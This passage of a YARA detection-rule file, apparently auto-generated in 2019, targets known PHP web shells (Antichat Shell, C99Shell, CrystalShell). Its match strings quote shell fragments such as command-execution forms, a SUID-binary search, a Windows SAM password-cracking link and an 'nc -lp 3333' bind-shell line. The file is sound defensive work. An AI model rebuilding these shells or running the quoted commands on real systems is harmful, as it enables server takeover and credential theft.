      hash2 = "ee5173c317d6aeaf2e5351e88df62ef004e0f805e0b9ace24d5c94e43813e2b4"
   strings:
      $x1 = "if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';" fullword ascii
      $s2 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s3 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
      $s4 = "//end downloader" fullword ascii
      $s5 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s6 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s7 = "eqs.submit();\">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>" fullword ascii
      $s8 = "if(@$_POST['action']==\"exit\")unset($_SESSION['an']);" fullword ascii
      $s9 = "<textarea name=\\\"data\\\" rows=\\\"40\\\" cols=\\\"180\\\">\".@readf($file).\"</textarea><br>" fullword ascii
      $s10 = "$contents = fread($le, filesize($file));" fullword ascii
      $s11 = "function shell($cmd){" fullword ascii
      $s12 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='exit'; document.reqs.submit();\">| EXIT |</a></td>" fullword ascii
      $s13 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='editor'; document.reqs.submit();\">| Editor</a></td>" fullword ascii
      $s14 = "echo \"<table cellSpacing=0 border=1 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s15 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='viewer'; document.reqs.submit();\">| Viewer</a></td>" fullword ascii
      $s16 = "<tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>\";" fullword ascii
      $s17 = "if($_SESSION['action']==\"\")$_SESSION['action']=\"viewer\";" fullword ascii
      $s18 = "<form name='reqs' method='POST'>" fullword ascii
      $s19 = "//end shell" fullword ascii
      $s20 = "echo \"<tr><td>Select drive:\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _C99Shell_v__1_0_pre_release_build_safe_mode__c99_w4cking_18 {
   meta:
      description = "php - from files C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_w4cking.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash2 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $x1 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $s2 = "if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array(\"/bin/FALSE\",\"/sbin/nologin\")));}" fullword ascii
      $s3 = "else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = TRUE;}}" fullword ascii
      $s4 = "elseif ($ft == \"ini\") {echo \"<pre>\"; var_dump(parse_ini_file($d.$f,TRUE)); echo \"</pre>\";}" fullword ascii
      $s5 = "<OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins" fullword ascii
      $s6 = "<OPTION VALUE=\"uname -a\">Kernel version" fullword ascii
      $s7 = "$hexdump_rows = 24;// 16, 24 or 32 bytes in one line" fullword ascii
      $s8 = "$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL." fullword ascii
      $s9 = "$bool = (empty($a[\"name_regexp\"]) and strpos($f,$a[\"name\"]) !== FALSE) || ($a[\"name_regexp\"] and ereg($a[\"name\"],$f));" fullword ascii
      $s10 = "if (!function_exists(\"posix_kill\") and !in_array(\"posix_kill\",$disablefunc)) {function posix_kill($gid) {return FALSE;}}" fullword ascii
      $s11 = "$hexdump_lines = 8;// lines in hex preview file" fullword ascii
      $s12 = "if ($v or strtolower($v) == \"on\") {$openbasedir = TRUE; $hopenbasedir = \"<font color=red>\".$v.\"</font>\";}" fullword ascii
      $s13 = "<OPTION VALUE=\"w\">Logged in users" fullword ascii
      $s14 = "$filestealth = TRUE; //if TRUE, don't change modify- and access-time" fullword ascii
      $s15 = "else {$openbasedir = FALSE; $hopenbasedir = \"<font color=green>OFF (not secure)</font>\";}" fullword ascii
      $s16 = "else {$safemode = FALSE; $hsafemode = \"<font color=green>OFF (not secure)</font>\";}" fullword ascii
      $s17 = "<input type=hidden name=act value=\"cmd\">" fullword ascii
      $s18 = "$head = explode(\"\",$stack[0]);" fullword ascii
      $s19 = "while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}" fullword ascii
      $s20 = "<input type=hidden name=\"cmd_txt\" value=\"1\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Antichat_Shell_v1_3_Antichat_Shell__Modified_by_Go0o_E_Antichat_Shell_19 {
   meta:
      description = "php - from files Antichat Shell v1.3.php, Antichat Shell. Modified by Go0o$E.txt, Antichat Shell.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "96c41509991a980cbf30b22615285895e0fd0e48aca7a63c04c446957fa2228e"
      hash2 = "190d230bc18e185161a0cda2ba705788ebe916abc4e48efcfbbc1263f90825b3"
      hash3 = "ee5173c317d6aeaf2e5351e88df62ef004e0f805e0b9ace24d5c94e43813e2b4"
   strings:
      $x1 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s3 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['command'].\"</textarea><br>" fullword ascii
      $s4 = "charset=windows-1251\">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s5 = "header('Content-Disposition: attachment; filename=\"'.$file.'\"');" fullword ascii
      $s6 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";}" fullword ascii
      $s7 = "//downloader" fullword ascii
      $s8 = "header('Content-Length:'.filesize($file).'');" fullword ascii
      $s9 = "<input type=\\\"submit\\\" name=\\\"save\\\" value=\\\"save\\\"><input type=\\\"reset\\\" value=\\\"reset\\\"></form>\";" fullword ascii
      $s10 = "if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . \" GB\";}" fullword ascii
      $s11 = "elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . \" MB\";}" fullword ascii
      $s12 = "elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . \" KB\";}" fullword ascii
      $s13 = "<input type=\\\"hidden\\\" name=\\\"action\\\" value=\\\"shell\\\">" fullword ascii
      $s14 = "header('Content-Type: application/octet-stream');" fullword ascii
      $s15 = "$info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));" fullword ascii
      $s16 = "$info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));" fullword ascii
      $s17 = "$info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));" fullword ascii
      $s18 = "if($action==\"download\"){ " fullword ascii
      $s19 = "return htmlspecialchars($contents);" fullword ascii
      $s20 = "while (($file = readdir($dh)) !== false) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_pre_release_build_safe_mode__c99_PSych0_20 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_PSych0.php"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash3 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
   strings:
      $s1 = "gn=\"left\"><b><?php if (!$win) {echo wordwrap(myshellexec(\"id\"),90,\"<br>\",1);} else {echo get_current_user();} ?></b>&nbsp;" ascii
      $s2 = "r&ft=download\\\"><u><b>Download</b></u></a>, and use lcp.crack+ " fullword ascii
      $s3 = "normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; " fullword ascii
      $s4 = "solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}" fullword ascii
      $s5 = "verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3" fullword ascii
      $s6 = "FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffff" fullword ascii
      $s7 = "else {echo \"<b><font color=green>You can crack winnt passwords. <a href=\\\"\".$surl.\"act=f&f=sam&d=\".$_SERVER[\"WINDIR\"].\"" ascii
      $s8 = "foreach ($tbl_struct as $field) {$name = $field[\"Field\"]; echo \"" fullword ascii
      $s9 = "b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"fi" ascii
      $s10 = "333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell v" ascii
      $s11 = "?></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input " ascii
      $s12 = "b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"" ascii
      $s13 = "dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font" ascii
      $s14 = "<tr><td width=\"100%\" height=\"1\" valign=\"top\" colspan=\"2\"><p align=\"center\"><b>:: <a href=\"<?php echo $surl; ?>act=cmd" ascii
      $s15 = "lor: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#00000" ascii
      $s16 = "cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor" ascii
      $s17 = "-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A {" ascii
      $s18 = ">!</b></font><a href=\"<?php echo $surl; ?>\"><font face=\"Verdana\" size=\"5\"><b>C99Shell v. <?php echo $shver; ?></b></font><" ascii
      $s19 = "t=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 borderc" ascii
      $s20 = "SOFTWARE; ?></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,\"<br>\",1); ?></b>&nbsp;</p><p" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Crystal_CrystalShell_v_1_21 {
   meta:
      description = "php - from files Crystal.txt, CrystalShell v.1.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
      hash2 = "278f96d0767d7ac781b617b189bc56a618f341887c2385a4b0af4676070c0171"
   strings:
      $s1 = "<br>Bind port to  :<br> bind shell " fullword ascii
      $s2 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value=\"1\">&nbsp;<input type=\"submit\" name=\"submi" ascii
      $s3 = "/* october73 shell & CrystalShell < coding by super crystal" fullword ascii
      $s4 = "/*      mail : sup3r-hackers@hotmail.Com" fullword ascii
      $s5 = "a\" size=\"-2\">Bind port to</font><font face=\"Webdings\" size=\"5\" color=\"#DCE7EF\">" fullword ascii
      $s6 = "if ($act == \"command\") {echo \"<center><b>CRYSTAL-H:<br><br>" fullword ascii
      $s7 = "</font></a><font size=\"7\" face=\"Martina\">CRYSTAL-H</font><span lang=\"en-us\"><font size=\"3\" face=\"Martina\"> </font>" fullword ascii
      $s8 = "if ($act == \"bind\") {echo \"<center><b>CRYSTAL-H:<br><br>-Connect " fullword ascii
      $s9 = "config.php " fullword ascii
      $s10 = "Select ------ x  " fullword ascii
      $s11 = "/*    ------------------------------------------------" fullword ascii
      $s12 = "/*                       --------- ----------" fullword ascii
      $s13 = "if ($act == \"upload\") {echo \"<center><b>" fullword ascii
      $s14 = "/**********************************************************/" fullword ascii
      $s15 = "/*********************************************************/" fullword ascii
      $s16 = "washer-crystal.txt   </a>.</b>\";}" fullword ascii
      $s17 = "<br>Command   </a>.</b>\";}" fullword ascii
      $s18 = "<font face=\"Webdings\" size=\"7\" color=\"#DCE7EF\">" fullword ascii
      $s19 = "<br>nc -lp 3333" fullword ascii
      $s20 = "if ($act == \"edit\") {echo \"<center><b>" fullword ascii
   condition:
      ( ( uint16(0) == 0x0a0d or uint16(0) == 0x3f3c ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

